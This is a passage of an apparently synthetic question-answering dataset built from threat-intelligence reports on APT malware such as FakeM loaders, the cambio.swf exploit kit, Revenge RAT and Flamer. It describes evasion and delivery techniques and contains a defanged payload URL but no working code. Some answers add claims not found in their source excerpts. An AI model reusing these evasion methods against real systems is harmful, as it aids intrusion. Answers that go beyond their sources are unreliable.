v7.49.1\". Hence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many other protocols, with full support of user/password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), proxies and SSL certificates.\nSmall Headline: Russian language used in fdsvc.dll\nIn spite of some 'Russian' words being used, it is evident that the malware author is not a native Russian speaker.\nOf our previous examples, five of the commands were likely produced by an online translation. Below we provide the examples and the correct analogues for reference:\nAnother example is \"kliyent2podklyuchit\". This is most likely a result of an online translation of \"client2connect\" (which means 'client-to-connect'). In this case, the two words \"client\" and \"connect\" were translated separately, then transliterated from the Russian pronunciation form into the Latin alphabet and finally joined to produce \"kliyent2podklyuchit\".\nSuch a result may look impressive to the bot's author, but would be difficult to understand for native Russian speakers.\nHere we provide an example of translating the word \"client\" in Russian - the word \"kliyent\" here only demonstrates phonetic pronunciation, not how it's actually written in a transliterated form. When formed using the Latin alphabet, it would actually be written \"client\" or \"klient\".\nDue to such inconsistencies, we conclude that the Russian language is likely used as a decoy tactic, in order to spoof the malware's country of origin.\nMedium Headline: Sample #6 \u2013 cambio.swf\nDuring the investigation of the watering-hole incident, the owner of a compromised website shared with us a malicious implant that was added into the site, presumably by using an exploit against JBoss 5.0.0.\nThe script is called view_jsp.java and is accessed from the watering-hole website as view.jsp.\nThis script is responsible for serving cambio.swf.\nThe infection starts from a primary web site being compromised so that its visitors are redirected into a secondary website, calling its view.jsp script from an added IFrame. The initial request contains parameter pagenum set to 1, such as:\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"\nThis begins the profiling and filtering to identify potential victims. For example, the script then checks to see if the\nclient's IP is black-listed. If so, such initial request is rejected.\nNext, the script checks if the client's IP is white-listed (i.e. targeted). If not white-listed, it is also rejected. Hence, unless the visitor's IP is on the attackers' list, the script will not attempt to infect their machine. This helps the infected websites stay undetected for relatively long period of time, as they only serve exploits to the selected targets.\nIn the next stage of the script, it builds and serves back to the client an HTML page with an embedded JavaScript that detects the type of client's browser (Internet Explorer, Google Chrome, Firefox, Safari, or Opera), OS version, and the loaded plugins, such as Adobe Flash and Microsoft Silverlight.\nThe script executed on a client side then builds a form, and submits it back to the gateway script, as shown below:\nThe submitted form specifies the pagenum parameter to be set to 2, to advance the script to the next step:\nOnce the script accepts the incoming request and finds the form's pagenum value is 2, it reads other fields from the submitted form and decides which exploit to serve back to the client.\nAt the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and Microsoft Silverlight, though these could be expanded upon as needed.\nThe exploits can be individually enabled or disabled by the attackers with the standalone file config.dat. For example, to enable both exploits (flag=1), the contents of this file can be set to:\nwhere 2016-0034 identifies the Silverlight exploit, and 0000-0001 is the Flash exploit.\nIf the script detects that the submitted form contains a non-empty version of Silverlight browser plugin, it will generate and serve back a Silverlight exploit. If the submitted form has a non-empty version of Adobe Flash browser plugin, the script will generate and serve back the Flash exploit. If the client has both plugins loaded within the browser, then the script will serve the Flash exploit only.\nNOTE: the script only serves the Flash exploit if the browser is Internet Explorer.\nThe exploits are generated by the functions:\n\u2022 genExp_20160034() \u2013 to generate Silverlight exploit\nThe latter is explained in further detail below. First, the script builds URL string named as download_url:\nFor example, the URL string may look like:\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data=\nNote that the pagenum parameter of the URL has now advanced to 3 (third step of the view.jsp execution).\nThis URL string will be embedded by the genExp_00000001() function into the body of the shellcode.\nThe output of the genExp_00000001() function is JavaScript that has the following format \u2013 this script will be executed inside the client's browser:\n01 var laskfji = 'PGh0bWw+..'; // long string here\nOnce the string s is base64-decoded by client-based JavaScript, it will look like a Flash object embedded into HTML:\n20 </body>\n21 </html>\nAs seen in the Flash object parameters, the SWF object is served from the website's path:\ninclude/cambio.swf\nHowever, the SWF object is also accompanied with 2 extra parameters:\nBy looking into the decompiled cambio.swf file, its ActionScript reveals that the SWF file indeed expects 2 parameters: Health and shell.\nThe value of Health is used as an XOR key to decode the binary blob orinBin, which is included in the SWF file. This blob is then loaded with loadBytes(), as shown below:\nBelow is the binary blob orinBin as seen within the SWF file:\nBy knowing the value of Health parameter, it is now possible to use it as an XOR key to decode the orinBin blob within the SWF code.\nOnce decrypted, the orinBin blob presents another SWF file. This time, it contains 3 encrypted blobs within: bin22, bin23, and bin24 seen below:\nThe code decrypts the blobs with RC4, using \"littleEndian\" as the RC4 key. These blobs also turn out to be SWF files that contain the SWF exploit code.\nInternally, the ActionScript also uses transliterated Russian words, similar to the tactic seen in the bot code:\nAs seen in the table, while the words are technically Russian, their usage is out-of-context.\nIn one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":\nAs such, it is obvious that the word \"dummy\" has been translated into \"chainik\". However, the word \"chainik\" in Russian slang (with the literal meaning of \"a kettle\") is used to describe an unsophisticated person, a newbie; while, the word \"dummy\" in the exploit code is used to mean a \"placeholder\" or an \"empty\" data structure/argument.\nIn the same way, it is likely the word \"farm animals\" was originally used to represent \"a beast\". Yet, it has been translated into a word that is only synonymous to \"the beast\" in a certain context.\nAs a result, they have used the words \"farm animals\" across the shellcode instead of \"beast\"; which makes little sense.\nAs in the case of sample #5 ( fdsvc.dll), it is likely that this loose Russian translation, evidently performed by a non-Russian speaker, is intended to spoof the malware origin.\n\nWhat are the backdoor commands used by the bot in the fdsvc.dll file, and how are they implemented?",
    "output": "The bot in the fdsvc.dll file uses several transliterated Russian words to issue backdoor commands. For example, the 'poluchit' command instructs the bot to receive a file, and the 'pereslat' command instructs the bot to upload a file. The received 'poluchit' command may also contain a URL, marked with the transliterated Russian word 'ssylka' (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command 'vykhodit', the bot quits its backdoor loop.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: By Joey Chen and MingYen Hsieh\nBLACKGEAR is an espionage campaign which has targeted users in Taiwan for many years. Multiple papers and talks have been released covering this campaign, which used the ELIRKS backdoor when it was first discovered in 2012. It is known for taking using blogs and microblogging services to hide the location of its actual command-and-control (C&C) servers. This allows an attacker to change the C&C server used quickly by changing the information in these posts.\nLike most campaigns, BLACKGEAR has evolved over time. Our research indicates that it has started targeting Japanese users. Two things led us to this conclusion: first, the fake documents that are used as part of its infection routines are now in Japanese. Secondly, it is now using blogging sites and microblogging services based in Japan for its C&C activity.\nThis post will discuss this C&C routine, the tools used in these attacks, and the connections between these tools.\nQuestion: Why did the BLACKGEAR espionage campaign use blogs and microblogging services to hide the location of its command-and-control (C&C) servers, and how does this technique benefit the attackers?",
    "output": "Answer: The BLACKGEAR espionage campaign used blogs and microblogging services to hide the location of its command-and-control (C&C) servers as a means to obfuscate its infrastructure. This technique benefits the attackers by allowing them to quickly change the C&C server used simply by updating the information in these posts. This dynamic approach makes it difficult for defenders to track and block the C&C communications, enhancing the resilience and longevity of the campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Malware Overview\nFirst discussed in January 2013 in a Trend Micro , FakeM is a Trojan that uses separate modules to perform its functionality. FakeM's functional code is shellcode\u00adbased and requires another Trojan to load it into memory and execute it. There are a variety of different Trojans used to load FakeM, some of which are more interesting than others. In this section, we will explore the loader Trojans followed by an analysis of the evolution of FakeM itself. We end this section with a discussion on tools related to FakeM and used by Scarlet Mimic.\nLoader Trojans\nFakeM is shellcode\u00adbased and therefore requires another Trojan to load FakeM into memory and execute its functional code. Threat actors have developed many different loading Trojans to load FakeM, some of which are fairly straightforward while others use very clever techniques to avoid detection. Unit 42 tracks the following list of loader Trojans that Scarlet Mimic has used to execute FakeM:\nCrypticConvo\nSkiBoot\nRaidBase\nFakeHighFive\nPiggyBack\nFullThrottle\nFakeFish\nBrutishCommand\nSubtractThis\nIt appears that the threat actors include the loader Trojans in some sort of builder application that allows actors to quickly create, configure and deploy payloads to execute FakeM. We believe this because many samples that execute FakeM have the same exact compilation time but different C2 servers, as seen in the example in Table 1. This suggests the actors compile a single sample and use a builder tool to configure individual samples on demand.\nWe used the loader Trojans to provide a general timeline for the development of FakeM samples, as FakeM is shellcode\u00adbased and does not contain any usable timestamps. The timestamps in the loader Trojans does not necessarily correspond to the usage of FakeM, but plotting the compile times of the loaders on a timeline shows an interesting trend. The scatter plot timeline in Figure 7 shows the known compilation times of the loader Trojans and the FakeM variant that it executed.\nBased on the timeline, it appears that the actors were actively developing several of the loaders at the same time from 2009 until the early months of 2014. After the first quarter of 2014, it appears that the actors abandoned development of the older loaders in favor of FakeFish, BrutishCommand and SubtractThis. This does not mean that actors will not continue to use the older loaders, but it does suggest that the actors will continue including the newer or freshly developed loaders in updated builder applications.\nThe timeline also presents the possibility that the FakeM developers reacted to the release of Trend Micro's FakeM and . Trend Micro published their analysis of the FakeM Trojan on January 17, 2013 (marked in Figure 7 by a red line) that discussed the original variant of FakeM. Shortly after, the original variant of FakeM drops off the timeline in favor of the SSL and Custom SSL variants. It is possible that the FakeM developers saw their tool was exposed and adapted it to avoid detection for continued use as a payload in attacks. We cannot be certain if the developers reacted\nspecifically to Trend Micro's content, as it is possible that they were reacting to the increased antivirus detection rate of their tool that resulted from the exposure of the tool. Regardless of the specific stimulus, the reaction shows that the FakeM threat actors evolved to avoid detection/attribution and to continue their attack campaigns.\nThe timeline does have one noticeable outlier, specifically the FakeHighFive sample compiled in September 2009 that loaded a FakeM SSL sample. We believe this compile time is incorrect, as the C2 domain for this sample, specifically press.ufoneconference[.]com, was registered by the threat actor in February 2013. The registration of the C2 domain in February 2013 aligns with other compilation times of FakeM SSL, which leads us to the conclusion that the September 2009 compilation timestamp was modified and/or inaccurate.\nMost of the related loader Trojans, such as CrypticConvo, PiggyBack, FullThrottle, FakeHighFive, FakeFish and RaidBase do little more than load encrypted FakeM shellcode (either from a PE resource or embedded data), decrypt it, and execute the resulting shellcode. Other related loading Trojans, such as SubtractThis, BrutishCommand and SkiBoot employ clever techniques worth discussing.\nSubtractThis\nThe SubtractThis loader displays a technique that is quite clever. This loader received its name based on a technique it uses to delay before carrying out its main functionality, specifically by requiring the user to hit the minus (\"\u00ad\") key. SubtractThis carries out this technique through the following steps:\n1. Calls LoadAcceleratorsA function to load the virtual key for the minus character \"\u00ad\". Example: LoadAcceleratorsA(hInstance, VK_SUBTRACT);\n2. Calls SetTimer function to set up a callback function that will be called in the event that the LB_FINDSTRING Windows message. Example: SetTimer(0, LB_FINDSTRING_, 10000u, TimerFunc);\n3. Creates a continuous loop that starts by calling GetMessageA to obtain Windows messages\n4. Calls TranslateAcceleratorA to check Windows message received is VK_SUBTRACT \"\u00ad\".\n5. Calls the callback function set up in the SetTimer function if the user enters the minus \"\u00ad\" key.\nThis technique requires user interaction, which makes analysis in sandboxes more difficult.\nBrutishCommand\nThe BrutishCommand loader uses a very interesting method to decrypt the FakeM functional code. The main function in this loader checks the command line arguments passed to it, and if there are none present it will obtain a random number between 0\u00ad9 and create a new process using the same executable with this random number as a command line argument.\nIf the executable has a command line argument, the Trojan subjects the value to a hashing algorithm and compares the hash to 0x20E3EEBA. If the value matches the static hash, the executable will\nsubject the command line argument to a second algorithm that will produce a value that the Trojan will use as the decryption key to decrypt the embedded FakeM shellcode. It essentially brute forces its own decryption key by rerunning itself over and over until it runs with the correct value is provided on the command line. Unit 42 had not seen this technique used by other malware families and it introduces a challenging hurdle when attempting to analyze or debug the loader Trojan.\nSkiBoot Loader\nSkiBoot reads the master boot record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode. It carries out this functionality by calling the ReadFile function to read 512\u00adbytes from \"\\\\.\\PHYSICALDRIVE0\" and specifically uses the last byte of the MBR as the encryption key. The last byte of the MBR is \"\\xAA\", or the second byte of \"\\x55\\xAA\", which is the boot signature portion of the MBR.\nInstead of using ReadFile, one variant of this loader reads the MBR using DeviceIOControl using the ID_CMD control code, and accesses a specific offset to obtain the value that it will rotate each byte in the ciphertext within the decryption algorithm. The significance of using DeviceIOControl is that the VMware hypervisor responds to this API call with a blank buffer instead of the MBR, whereas the Virtualbox hypervisor returns the MBR correctly. It appears that this loader is specifically using the DeviceIOControl API function as a VMware detection technique, suggesting that the developers are well versed in the nuances of the VMware hypervisor and virtual machine evasion.\n\nBased on the above text, answer a question. How does the SkiBoot loader Trojan used by Scarlet Mimic utilize the Master Boot Record (MBR) for its operations, and what implications does this have for cybersecurity defenses?",
    "output": "SkiBoot reads the Master Boot Record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode. It does this by reading 512 bytes from '\\\\.\\PHYSICALDRIVE0' and using the last byte of the MBR, which is '\\xAA'. One variant of this loader uses DeviceIOControl with the ID_CMD control code to read the MBR, which acts as a VMware detection technique since VMware hypervisors respond differently to this API call. This technique has implications for cybersecurity defenses because it demonstrates the threat actors' advanced knowledge of system internals and virtual machine evasion tactics, necessitating more sophisticated detection and analysis methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the implications of the Red October campaign on the future of cyber conflict in the oil and gas industry? How does the sophistication of Red October indicate a shift in cyber warfare tactics?",
    "output": "The Red October campaign, which targeted both diplomatic entities and the oil and gas industry, showcases a high level of sophistication in terms of infrastructure and methods used. This sophistication suggests a significant evolution in cyber conflict tactics. The oil and gas industry can expect to see more advanced and persistent threats, with attacks becoming increasingly complex and destructive. The modular nature of malware used in such campaigns blurs the line between espionage and sabotage, making it crucial for the industry to enhance its defenses against multi-faceted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Attack Flow\nThe components of the attack span multiple stages. Figure 2 (below) shows the steps involved in the attack.\nStep 1: The DOCX file (\"Rooming List Reservas para 3 Familias.docx\") used in the attack vector downloads the \"1.docx\" (template) from the CnC server\nSteps 2 and 3: The embedded \"Microsoft_Excel_Macro-Enabled_Worsksheet1.xlsm\" file in \"1.docx\" (template) downloads the PowerShell code \"A.txt\" from the CnC server and executes it in memory.\nStep 4: The PowerShell code in \"A.txt\" downloads \"index.mp3\" from the CnC server and saves it as \"index.vbs.\"\nStep 5: Upon execution, \"index.vbs\" creates \"opera.vbs,\" which contains code to execute \"opera.ps1\" created in the next step.\nStep 6: \"index.vbs\" downloads \"1.txt\" and saves it as \"opera.ps1,\" which has obfuscated Revenge RAT in it.\nStep 7: \"opera.vbs\" executes \"opera.ps1.\"\nA detailed analysis of files used during various stages of the attack is provided below.\nBig Headline: The Initial Document\nThe initial document, \"Rooming List Reservas para 3 Familias.docx,\" used as the attack vector is a DOCX file. The document uses a technique known as Dynamic Office Template Injection to bypass security products. This allows the attacker to store the malicious file on a remote server. This technique can evade anti-malware solutions that rely on static detection.\nThe document has the structure shown in Figure 3 (below). The structure contains a file named \"footer.xml.rels.\" The \"target\" fields in the file point to the templates hosted on the CnC server. There are several URLs in the \"target\" fields that point to files \"1.docx\" all the way to \"9.docx\" hosted on the CnC server. Each of the files has the same content (the same SHA-256: 338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9).\nWhen the victim opens the document, one of the templates is downloaded and executed.\nBig Headline: The Template File\nThe template file(\"1.docx\" ... \"9x.docx\") follows the structure shown in Figure 4 (below). The settings.xml in the structure have the \"target\" fields that point to XLSM files, which are present in the \"embeddings'' directory in the structure of the DOCX file.\nThe XLSM files \"Microsoft_Excel_Macro-Enabled_Worksheet.xlsm\" to \"Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm\" have the same contents (same SHA-256: 32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2). When the template file (\"1.docx\" ... \"9x.docx\") is executed by Microsoft Word, it executes one of the XLSM files (\"Microsoft_Excel_Macro-Enabled_Worksheet.xlsm\" to \"Microsoft_Excel_MacroEnabled_Worksheet9.xlsm\").\nBig Headline: The XLSM File\nThe XLSM file follows the structure shown in Figure 5 (below). The structure contains macros in the \"VBAProject.bin\" file. The following screenshot shows the stream containing the macros.\nThere are two important macros present in the BIN file: \"Macro 1\" kills the Microsoft Word process \"winword.exe\" and \"Macro 2\" downloads and executes the PowerShell code present at the URL\n\"hxxp://azulviagens[.]online/A.txt\" in memory.\nFigure 6 (below) shows the contents of \"A.txt.\"\nWhen the PowerShell code in \"A.txt\" is executed, it downloads the contents of \"index.mp3\" and saves it to file the \"index.vbs\" and executes it.\nBig Headline: Opera.ps1\n\"Opera.ps1\" is a highly obfuscated PowerShell script (see Figure 8, below). One thing that catches our eye is the string \"4D 5A,\" which indicates the magic header of a Windows executable.\nAfter de-obfuscating the PowerShell code, we were able to retrieve the Windows executable, which is the Revenge RAT. Below is the description of the Revenge RAT we extracted.\nSimilar PowerShell code was also found hosted on x-root.net, which has also been registered in recent months. Uptycs' EDR capabilities can decode the obfuscated PowerShell code, as shown in the screenshot below (Figure 9).\nMedium Headline: IdGenerator\nThe class IdGenerator shown in Figure 12 (below) is used for creating a unique ID for the victim machine, which the RAT is going to send to the CnC server. A unique string ID is generated by retrieving various system attributes using the methods in the class. Below are some of the methods:\nGetActiveWindow: Get active window or window of the application used by the user\nGetAV: Get the antiviruses installed on the system\nGetCamera: Get information about the camera\nGetCpu: Get CPU information\nGetHardDiskSerialNumber: Get hard disk serial number\nGetIp: Get IP address\nGetSystem: Get processor information\nSendInfo: Concatenate information collected by previous methods into a string \"id\"\n\nAnswer this question based on the above context: What specific techniques are employed by the initial DOCX file to evade anti-malware solutions, and how does the structure of the document facilitate this evasion?",
    "output": "The initial DOCX file, 'Rooming List Reservas para 3 Familias.docx', employs Dynamic Office Template Injection to evade anti-malware solutions. This technique allows the attacker to store the malicious file on a remote server, thereby bypassing static detection methods. The document's structure includes a file named 'footer.xml.rels', which contains 'target' fields pointing to templates hosted on the CnC server. These templates are downloaded and executed when the victim opens the document. By spreading the malicious components across multiple files and using remote servers, the attackers can effectively evade traditional security measures that rely on static analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background\nThe first server was set up on May 18, 2012, and, just five hours after it was set up, it recorded the first interaction with a Flamer-compromised client. The server would go on to control at least a few hundred compromised clients over the next few weeks. The second server was set up on March 25, 2012, and controlled over a thousand clients in a period of just over one week.\nThe servers had been set up to record a minimal amount of information in case of discovery. The systems were configured to disable any unnecessary logging events and entries in the database were deleted at regular intervals. Existing log files were securely deleted from the servers on a regular basis. These steps were taken in order to hamper any investigation should the server fall into the hands of investigators or law enforcement.\nHowever, the attackers were not thorough enough, as files revealing the entire history of the servers' setup were available and a limited set of encrypted records Figure 1 in the database revealed that compromised clients had been connecting from the Middle East. We were also able to recover the nicknames of four authors\u2014D***, H*****, O******, and R***\u2014who had worked on the code at various stages and on differing aspects of the project.\nOn both servers command-and-control activity happens through a Web application called Newsforyou. It processes the W32.Flamer client interactions and provides a simple control panel. The control panel allows the attackers to upload packages of code to deliver to compromised clients, and download packages containing stolen client data. However, in a technique not previously seen before the uploaded and downloaded packages are encrypted, so infiltrating the command-and-control server does not reveal the code or the stolen client data. The command-\nData security compartmentalization used by W32.Flamer attackers\nand-control server simply serves as a proxy for the data and the data is encrypted and decrypted offline by the attackers using keys unique to each client. This application also contains functionality to communicate with clients compromised by malware other than Flamer. The Web application was designed to be a framework for supporting different malware campaigns.\nIn addition to avoiding the compromise of their operations, preventing both the uploading of rogue code and viewing of stolen data, the setup also maintains a clear distinction of roles. The roles include those responsible for setting up the server (admins), those responsible for uploading packages and downloading stolen data through the control panel (operators), and those holding the private key with the ability to decrypt the stolen data (attack coordinators). The operators themselves may actually be completely unaware of the contents in the stolen data. This is due to design of the process to use data security compartmentalization techniques, as shown in Figure 1.\nDespite these techniques, we were still able to determine that one of the servers delivered a module instructing Flamer to (<http://www.symantec.com/connect/blogs/flamer-urgent-suicide>)commit suicide and wipe itself off computers in late May 2012, an action we also witnessed through compromised honeypots.\nFinally, access to the control panel required a password which is stored as a hash. Despite brute force attempts at reversing the hash to plain text, we were unable to determine the plain text password.\nWhat follows is a thorough analysis of one of the command-and-control servers, detailing the server setup, the Web application developed by at least four separate authors since 2006, the control panel used by the operators, and the database that helps drive the application. The report also includes key information about a second server, but in-depth details have been omitted to maintain the brevity of this report. The functionality and structure of both servers is identical. The differences are mainly in the amount of data and number of clients the servers were exposed to.\nAnswer this question: What techniques did the W32.Flamer attackers use to minimize the risk of detection and investigation if their servers were discovered, and how effective were these measures?",
    "output": "The W32.Flamer attackers minimized the risk of detection and investigation by configuring their servers to record minimal information. They disabled unnecessary logging events, deleted database entries at regular intervals, and securely wiped existing log files. These steps aimed to hamper any investigation if the servers fell into the hands of investigators or law enforcement. However, the attackers were not entirely thorough, as files revealing the entire history of the servers' setup were available, and a limited set of encrypted records indicated that compromised clients had been connecting from the Middle East. Additionally, the nicknames of four authors who worked on the code were recovered, showing that while the measures were extensive, they were not foolproof.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: exeCutIve suMMary\nSince 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. The majority of these security breaches are attributed to advanced threat actors referred to as the \"Advanced Persistent Threat\" (APT). We first published details about the APT in our January (<https://www.mandiant.com/resources/m-trends/>)2010  report. As we stated in the report, our position was that \"The Chinese government may authorize this activity, but there's no way to determine the extent of its involvement.\" Now, three years later, we have the evidence required to change our assessment. The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them.3\nMandiant continues to track dozens of APT groups around the world; however, this report is focused on the most prolific of these groups. We refer to this group as \"APT1\" and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1's operations compelled us to write this report.\nThe activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted. Though our visibility of APT1's activities is incomplete, we have analyzed the group's intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1's attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others.\nOur analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China's cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign in large part because it receives direct government support. In seeking to identify the organization behind this activity, our research found that People's Liberation Army (PLA's) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.\n3 Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations. None of the information in this report involves access to or confirmation by classified intelligence.\n\nBased on the above text, answer a question. How did Mandiant track APT1's activities back to specific locations in Shanghai? What methods were employed to uncover APT1's attack infrastructure and modus operandi?",
    "output": "Mandiant tracked APT1's activities back to specific locations in Shanghai by analyzing the group's intrusions against nearly 150 victims over seven years. Through this analysis, Mandiant identified four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. Mandiant employed various methods to uncover APT1's attack infrastructure and modus operandi, including analyzing the group's tools, tactics, and procedures (TTPs), as well as identifying command and control (C2) infrastructure. By leveraging their unique vantage point responding to victims, Mandiant was able to attribute specific personas to APT1, providing insights into the individuals behind the keyboard. This comprehensive approach allowed Mandiant to map out the extent of APT1's operations and understand their methodologies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the reuse of email addresses and infrastructure between different campaigns, such as Mirage and Elderwood, suggest potential connections between these operations, and what implications does this have for cybersecurity investigations?",
    "output": "The reuse of email addresses (e.g., jeno_1980@hotmail.com & king_public@hotmail.com) and infrastructure (such as Dynamic DNS services operated by 3322.org) between different campaigns suggests potential connections between these operations. This reuse indicates that the same actors or closely affiliated groups may be involved in multiple campaigns. For cybersecurity investigations, this implies that tracking and analyzing reused elements can help identify patterns and link seemingly disparate attacks, providing valuable intelligence for attribution and defense strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nIt is already well-known that Lazarus Group has targeted and successfully(<https://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html>) breached several prominent cryptocurrency companies and exchanges. From these breaches, law enforcement agencies suspect that the group has amassed nearly (<http://www.bbc.com/news/world-asia-42378638>)$100 million worth of cryptocurrencies based on their value today. We hypothesize that many of these previously reported operations targeting cryptocurrency organizations have actually been conducted by the espionage team of the Lazarus Group based on evidence we provide in the Attribution section. Further, we assess that until today, many of Lazarus Group's traditional financially motivated team have remained largely in the shadows as they conduct these operations adding to their already impressive stockpile of various cryptocurrencies.\nSeveral (<https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware-0>)watering hole attacks targeting the banking and financial industries that occurred at the end of 2016 and beginning of 2017 utilized a first stage downloader implant dubbed (<https://www.symantec.com/security_response/writeup.jsp?docid=2017-020908-1134-99>)Ratankba. During those incidents, Lazarus Group primarily used Ratankba as a reconnaissance tool, described by colleagues at Trend Micro as a utility to \"(<https://blog.trendmicro.com/trendlabs-security-intelligence/ratankba-watering-holes-against-enterprises/>)survey the lay of the land.\" In this research we detail a new implant dubbed PowerRatankba, a PowerShell-based malware variant that closely resembles the original Ratankba implant. We believe that PowerRatankba was likely developed as a replacement in Lazarus Group's strictly financially motivated team's arsenal to fill the hole left by Ratankba's discovery and very public documentation (<https://blog.trendmicro.com/trendlabs-security-intelligence/ratankba-watering-holes-against-enterprises/>)earlier this year.\nIn this report, we first provide a brief timeline of events related to the malicious activity. Next, we describe the various delivery methods that Lazarus Group utilized to infect victims with PowerRatankba (Fig. 1). We then detail the inner workings of PowerRatankba and how it is utilized to deliver a more fully capable backdoor to interesting victims (Fig. 1). Following that, we share details on a new and emerging threat targeting the South Korean point-of-sale industry that we have dubbed RatankbaPOS (Fig. 1). Finally, we explain our high-confidence attribution to Lazarus Group.\nQuestion: Why did the Lazarus Group develop the PowerRatankba implant, and how does its functionality compare to the original Ratankba implant?",
    "output": "Answer: The Lazarus Group developed the PowerRatankba implant as a replacement for the original Ratankba implant after the latter's discovery and extensive public documentation. PowerRatankba is a PowerShell-based malware variant that closely resembles the original Ratankba implant in terms of functionality. Both implants were used primarily as reconnaissance tools to 'survey the lay of the land.' However, PowerRatankba was designed to fill the gap left by Ratankba's exposure, indicating an evolution in the group's tactics to maintain their ability to conduct financially motivated operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Infrastructure and backend connections\nA preferred method for grouping targeted attack activity together is through cataloguing of the malicious use of network infrastructure. Command-and-control infrastructure can be costly and difficult to maintain, with the added complication that availability may be disrupted by researchers, law enforcement, or a spooked system administrator (in the case of compromised infrastructure). Even well-resourced attackers have a tendency for reusing command-and-control or phishing infrastructure. For threat intelligence teams building databases of targeted attack-related infrastructure, this is often the most telling sign of an attacker resurfacing or retooling. In rare instances, multiple attack groups may go after the same vulnerable server (particularly with teams that insist on using compromised infrastructure rather than mounting their own) but this remains rare enough to be an outlier. The trend at this time remains that even in cases of infrastructure reuse between teams, these occur within the same threat actor cluster (as in the case of multiple independent 'Chinese-speaking' threat actors getting their hands on the same zero-days, some overlapping infrastructure, or sharing lateral movement tools \u2013 a situation that speaks more to the tasking arrangement or 'community' of attackers in this cluster than to a breakdown in attribution methods).\nIn the case of researchers with a privileged point of view, such as those working with email services, ISPs, or those providing support for a compromised server, backend connections can be a serendipitous and often telling attributory indicator. What we\nmean by 'backend connections' are connections that take place when an attacker retrieves data from an exfiltration server or email account, prepares a staging or phishing server, or checks in on a compromised domain to assure its continued availability. Attackers almost always use Tor or some other anonymizing service to mask this connection but mistakes happen more often than not. The mistake will likely provide researchers with an IP or a region telling of the native operations of the attacker.\nSmall Headline: Malware families\nAlthough even the most advanced threat actors may rely on publicly available tools, most take the time to build their toolkits and develop custom backdoors, lateral movement tools, and exploits. Knowing the value of what they've developed, actors will jealously guard their toolkit, thereby allowing researchers to hone in on a threat actor by the presence of a tightly controlled malware family. In simpler terms: if Snake is present then it looks like Turla; if WildPositron malware is found then it's probably Lazarus, and so on. It's important to remember that 'malware ownership' isn't static. Just as the malware itself develops over time, the ownership may be transferred. It can be shared with other teams in the same cluster, developers may leave or set up their own shops, or source code may leak through a variety of circumstances.\nSmall Headline: Code reuse\nIn cases where an actor has been exposed or has found other motivations for a top-down retooling, code reuse can indicate a relationship between currently used tools and their predecessors. Coders can be quite lazy and even when the intention is a full retooling, malware developers will often reuse specifi c functions or pieces of code that have worked well in the past. This means that the avid researcher or obsessive yara rule writer may be able to hone in on these traits and connect new and old campaigns, or even seemingly unrelated threat actors.\nSmall Headline: Passwords\nA similar circumstance applies to the reuse of passwords. These may be the passwords to email accounts used for phishing or exfiltration, accounts on compromised servers, or hard-coded passwords in malware components. A recent example saw a threat actor deploying droppers with password-protected resources that contained the actual payload in an attempt to thwart sandboxes and automatic detection systems. The hard-coded password protecting the resource was the same even when different, seemingly unrelated malware families were being dropped, thus allowing researchers to tie the two malware families to the same actor. This also applies to hard-coded encryption keys in different malware families or campaigns.\nSmall Headline: Exploits\nFinally, zero-day exploits are a great source of excitement in research circles these days. The presence of an '0-day' immediately sets an actor apart from the run-of-the-mill attackers, thus justifying greater researcher involvement.\nThough exploits may be repurposed or acquired from public sources, a greater emphasis on responsible disclosure has limited the availability of the latter by dissuading the release of fully developed 'proof-of-concept' code that may aid attackers in leveraging newly discovered exploits2 . That said, many advanced attackers have exploit developers in house, with some threat actors unleashing a seemingly unlimited supply of exploits where needed.\nWith a given exploit being an arcane and jealously guarded weapon in the attacker's arsenal, home grown implementations of an exploit allow researchers to group together diverse malware families or separate campaigns to a given 